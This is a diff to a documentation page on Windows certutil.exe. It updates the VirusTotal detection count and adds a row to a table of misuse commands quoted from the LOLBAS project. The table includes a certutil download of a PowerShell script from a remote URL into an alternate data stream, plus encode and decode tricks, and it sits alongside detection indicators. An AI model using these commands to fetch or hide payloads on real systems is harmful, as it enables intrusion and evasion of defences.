@@ -194,8 +194,8 @@ C:\Windows\SYSTEM32\ntdll.dll |
 
 ## File Scan
 
-* VirusTotal Detections: 0/67
-* VirusTotal Link: https://www.virustotal.com/gui/file/8de7b4eb1301d6cbe4ea2c8d13b83280453eb64e3b3c80756bbd1560d65ca4d2/detection/
+* VirusTotal Detections: 0/76
+* VirusTotal Link: https://www.virustotal.com/gui/file/8de7b4eb1301d6cbe4ea2c8d13b83280453eb64e3b3c80756bbd1560d65ca4d2/detection
 
 
 ## Possible Misuse
@@ -236,6 +236,7 @@ Source | Source File | Example | License
 [LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Certutil.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Certutil.yml) | `- Command: certutil.exe -urlcache -split -f https://raw.githubusercontent.com/Moriarty2016/git/master/test.ps1 c:\temp:ttt` | 
 [LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Certutil.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Certutil.yml) | `- Command: certutil -encode inputFileName encodedOutputFileName` | 
 [LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Certutil.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Certutil.yml) | `- Command: certutil -decode encodedInputFileName decodedOutputFileName` | 
+[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Certutil.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Certutil.yml) | `- Command: certutil --decodehex encoded_hexadecimal_InputFileName ` | 
 [LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Certutil.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Certutil.yml) | `- Path: C:\Windows\System32\certutil.exe` | 
 [LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Certutil.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Certutil.yml) | `- Path: C:\Windows\SysWOW64\certutil.exe` | 
 [LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Certutil.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Certutil.yml) | `- IOC: Certutil.exe creating new files on disk` | 
